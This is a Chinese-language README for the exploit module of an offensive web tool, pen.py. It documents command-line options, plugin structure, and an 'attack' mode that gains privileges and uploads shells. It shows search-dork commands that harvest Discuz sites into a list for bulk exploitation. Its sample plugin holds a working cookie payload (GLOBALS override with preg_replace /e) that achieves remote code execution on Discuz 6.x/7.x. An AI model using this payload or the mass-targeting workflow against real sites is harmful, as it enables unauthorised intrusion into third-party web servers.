
# 1 常用web漏洞exploit

本目录下的exploit需要使用**pen.py exploit**命令执行，例如：

    pen.py exploit -e cms_joomla_3_4_session_object_injection.py -u http://192.168.14.157/joomla/ --attack

和*pen.py*的"google hacking"工具组合可实现批量漏洞检测/漏洞利用

例如：
    
google hacking获取discuz站点，并记录到*dc.txt*文件
    
    pen.py search "inurl:faq.php?action=grouppermission" --unique -s 10 -o dc.txt

使用*Discuz 7 faq.php grouppermission SQL注入*这个exploit verify模式验证*dc.txt*中所有的discuz站点

    pen.py exploit -e "faq.php" -u @dc.txt

---

# 2 exploit使用

exploit帮助信息，*pen.py exploit -h*

    usage: pen.py exploit [-h] [--createdb] [--register REGISTER]
                      [--update UPDATE] [--delete DELETE] [-q QUERY] [-l]
                      [--detail DETAIL] [-e EXECUTE] [-u URL] [--verify]
                      [--attack] [--cookie COOKIE] [--useragent USERAGENT]
                      [--referer REFERER] [--headers HEADERS] [--proxy PROXY]
                      [--elseargs ELSEARGS] [--output OUTPUT]

    Exploit系统，执行exploit、批量执行exploit、管理exploit

    optional arguments:
      -h, --help            show this help message and exit

    exploit管理:
      --createdb            创建exploit信息数据库
      --register REGISTER   指定exploit目录或exploit文件，注册exploit信息
      --update UPDATE       根据exploit文件更新exploit注册信息
      --delete DELETE       根据exploit名字删除exploit注册信息
      -q QUERY, --query QUERY
                            搜索exploit，参数格式column:keyword，column支持expName/os/webser
                            ver/language/appName，默认为expName
      -l, --list            列举所有exploit
      --detail DETAIL       根据exploit名称显示某个exploit的详细信息   

    exploit执行:
      -e EXECUTE, --execute EXECUTE
                            exploit执行，参数格式column:keyword，column支持expName/os/webser
                            ver/language/appName，默认为expName
      -u URL, --url URL     指定目标URL，使用@file指定url列表文件
      --verify              验证模式
      --attack              攻击模式
      --cookie COOKIE       指定Cookie
      --useragent USERAGENT
                            指定UserAgent
      --referer REFERER     指定referer
      --headers HEADERS     指定其他HTTP header,例如--header 'xxx=xxxx#yyy=yyyy'
      --proxy PROXY         指定proxy，例如--proxy http:http://127.0.0.1:8888
      --elseargs ELSEARGS   指定其他参数,例如--elseargs 'xxx=xxxx#yyy=yyyy'
      --output OUTPUT       指定输出文件，仅输出验证成功案例

## -e/--execute

最重要的参数，用于指定执行某些exploit，有以下几种使用方式：

1、直接执行某个.py文件
    
    pen.py exploit -e cms_discuz_6_x7_x_cookie_rce.py -u http://xxx.com

2、根据exploit名字或名字中的关键字指定exploits

    pen.py exploit -e "faq.php" -u http://xxx.com   
    # 从exploit数据库中查找exploit名字包含"faq.php"的所有exploit并执行

3、根据其他字段关键字指定exploits

    pen.py exploit -e appName:discuz -u http://xxx.com   
    # 从exploit数据库中查找appName包含"discuz"关键字的所有exploit并执行

## -u/--url

最常用的参数，用于指定目的地址，可以是url，也可以使用*@file*指定url列表文件

## --cookie/--referer/--useragent

手工指定cookie、referer、useragent

## --header

自定义其他header，格式为*xxx=xxxx#yyy=yyyy*，这里使用*#*作为分隔符分割不同的header

## --elseargs

自定义某些exploit需要的专有参数，格式为*xxx=xxxx#yyy=yyyy*，这里使用*#*作为分隔符分割不同的自定义参数

例如*Discuz 备份文件短文件名爆破*这个exploit，需要指定”爆破深度“等信息，这些需要该参数的支持

    pen.py exploit -e "备份文件" -u http://127.0.0.1/discuz/x2.5/ --elseargs type=discuzx#date=16-02-28#days=5#dirs=2

## --verify/--attack

指定验证模式或攻击模式，前者仅验证漏洞是否存在，后者会进行攻击获取权限

## -l/--list

列举所有exploit

## -q/--query

查询exploit，可从*expName/os/webserver/language/appName*这几个字段查询exploit，格式为*column:keywords*默认搜索*expName*

例如：

    pen.py exploit -q "faq.php"
    # 搜索exploit名字中包含"faq.php"的exploit

    pen.py exploit -q appName:discuz
    # 搜索appName列，返回该列中包含"discuz"关键字的行

## --detail

根据exploit名称显示某个exploit的详细信息

## --delete 

根据exploit名字删除exploit注册信息

## --update

据exploit文件更新exploit注册信息

## --register

指定exploit目录或exploit文件注册exploit信息，一般情况下无需进行注册，所有exploit只要执行过一次都会自动注册

## --createdb

exploit模块的所有信息存储在*exploit*目录下的*exploit.db*数据库文件中，如果没有该数据库文件则需要先创建

---

# 3 exploit编写

exploit需要用python2编写，放入exploit目录根下(不支持放入exploit下的子目录)。

exploit编写需要使用Exploit类和Result类，因此在任意exploit中请进行如下包导入：

    from script.libs.exploit import Exploit
    from script.libs.exploit import Result

Exploit类提供了exploit编写的一系列方法，Result用于记录exploit的执行结果信息。

任何一个exploit都由以下几个部分组成。
    
## 3.1 包导入部分

    from script.libs.exploit import Exploit
    from script.libs.exploit import Result

## 3.2 exploit信息描述部分

    class DiscuzRCE(Exploit):
        expName = u"Discuz 6.x 7.x cookie GLOBALS变量覆盖RCE"
        version = "1.0"
        author = "alpha1e0"
        language = "php"
        appName = "discuz"
        appVersion = "6.x 7.x"
        reference = ['http://www.wooyun.org/bugs/wooyun-2014-080723', 'http://bobao.360.cn/learning/detail/107.html','http://www.secpulse.com/archives/2338.html']
        description = u'''
            变量替换、利用preg_replace的/e参数实现远程命令执行
            漏洞利用条件：
                1.Discuz 6.x 7.x; 
                2.php<5.5.0; 
                3.php.ini request_order = "GP"，php>=5.3默认
                4.两种利用方式，需要的条件不一样，分别为：
                    viewthread.php?tid=1 帖子或帖子的回复中插入有“表情”
                    announcement.php 有公告信息
            gh: inurl:viewthread.php
        '''

`expName`: 必须填写，exploit的名称，支持中文(使用u""定义unicode类型字符串，否则会出现乱码)

`os`: 建议填写，操作系统类型，exploit搜索时会搜索该字段

`webserver`: 建议填写，服务器类型，exploit搜索时会搜索该字段

`language`: 建议填写，编程语言，exploit搜索时会搜索该字段

`appName`: 建议填写，Application类型，exploit搜索时会搜索该字段

`version`: exploit版本信息

`author`: 编写exploit的作者的信息

`appVersion`: Application版本

`vulDate`: 相关漏洞发现时间

`vulType`: 相关漏洞类型

`reference`:  漏洞参考信息

`descripton`: 描述信息


以上exploit信息会在第一次exploit执行时自动存储到数据库中，这些信息用于参考，因此没有严格的格式要求，但良好的格式便于模块查询和批量处理

## 3.3 exploit主体部分

exploit主体部分是实现一个exploit的业务逻辑部分，在exploit主体中有一些已经定义好的方法和属性可以使用，一个exploit只需要实现几个方法，并且填充结果数据即可。

### 3.3.1 exploit中应该实现的方法

一个exploit应该实现`_info`,`_verify`,`_attack`这3个方法中的1个或者多个

**_info**方法

对应*Information模式*

在一些攻击场景中，脚本只能用于提供一些手工渗透的辅助信息，例如生成攻击payload，在此种应用场景中需要实现 _info 方法，该方法仅仅生成渗透的辅助信息，并填写到Result对象中。

**_verify** 

对应*POC模式*

该方法仅用于验证目标系统是否存在漏洞。

**_attack**方法

对应*exploit*模式。

该方法用于实现真正的攻击过程，获取权限、上传shell等。


### 3.3.2 Exploit类中提供的属性和方法

实现exploit需要继承基类Exploit，在基类Exploit中实现了一些有用的属性和方法。

**属性**

`url`: 目的URL，在命令行中提交的URL参数会传递到这里，例如: http://test.com/path/some.php?id=1&name=alice

`protocol`: URL对应的协议，例如http,https

`uri`: 目的URI，相当于协议类型 + HOST，例如: http://test.com

`host`: 目的HOST，例如: test.com

`path`: 目的URL的路径部分，例如: /path/some.php

`baseURL`: URL基础路径，例如: http://test.com/path

`params`: URL参数，字典形式，例如: {'id':1, 'name':'alice'}

`args`: 命令行中提供的其他参数，对应--elseargs，字典形式

`http`: Exploit提供的http session对象，这里使用requests库提供的Session对象。requests库请参考[这里](https://github.com/kennethreitz/requests)


**方法**

`urlJoin`: urlJoin(path)，该方法将指定的path和self.url中的baseURL拼接在一起


### 3.3.3 将结果信息填充到Result对象中

exploit执行的结果信息填充在Result对象中，Result对象中有以下属性(其中有的属性自动填充，有的需要手动填写):

`target` : exploit的目的主机。自动填充

`expname` : exploit名称。自动填充

`isvul` : 是否存在漏洞。需要填充，当['fullpath','payload','vulinfo','shellpath','attachment']其中之一被填充是，该项会被自动填充为VUL；当发生异常时，会被自动填充为ERROR。其他情况需要手动填充。

    NOTVUL : 不存在漏洞
    VUL    : 存在漏洞
    INFO   : 漏洞情况未知，存在渗透信息（用于payload生成类型的exploit）
    ERROR  : exploit执行失败

`fullpath` : 存在漏洞的URL全路径。选择填充

`payload` : exploit使用的有效payload。选择填充

`vulinfo` : exploit执行返回的信息，例如数据库账户名等。选择填充

`shellpath` : 写入的shell路径地址。选择填充

`attachment` : 附件。选择填充

`elseinfo` : 其他信息。选择填充

`paramtype` : exploit发送请求的类型，GET/POST等。选择填充

`params` : exploit发送请求的内容。选择填充


### 3.4 示例

    from script.libs.exploit import Exploit
    from script.libs.exploit import Result

    class DiscuzRCE(Exploit):
        expName = u"Discuz 6.x 7.x cookie GLOBALS变量覆盖RCE"
        version = "1.0"
        author = "alpha1e0"
        language = "php"
        appName = "discuz"
        appVersion = "6.x 7.x"
        reference = ['http://www.wooyun.org/bugs/wooyun-2014-080723', 'http://bobao.360.cn/learning/detail/107.html','http://www.secpulse.com/archives/2338.html']
        description = u'''
            变量替换、利用preg_replace的/e参数实现远程命令执行
            漏洞利用条件：
                1.Discuz 6.x 7.x; 
                2.php<5.5.0; 
                3.php.ini request_order = "GP"，php>=5.3默认
                4.两种利用方式，需要的条件不一样，分别为：
                    viewthread.php?tid=1 帖子或帖子的回复中插入有“表情”
                    announcement.php 有公告信息
            gh: inurl:viewthread.php
        '''

        def _verify(self):
            result = Result(self)

            sig = '_SERVER["HTTP_HOST"]'
            cookie = "GLOBALS[_DCACHE][smilies][searcharray]=/.*/ei; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();"
            headers = dict()
            headers['Cookie'] = cookie

            response = self.http.get(self.url, headers=headers)
            
            if response.status_code == 200:
                if sig in response.content:
                    result['fullpath'] = self.url
                    result['payload'] = 'Cookie: '+cookie   

            return result

---

# 4 注意事项

1. exploit文件名（不包含扩展名）中不能包含'.'点号，否则会与python中包机制冲突导致找不到exploit

# 5 其他

该exploit系统的基本思路参考了[PocSuite](https://github.com/knownsec/Pocsuite)
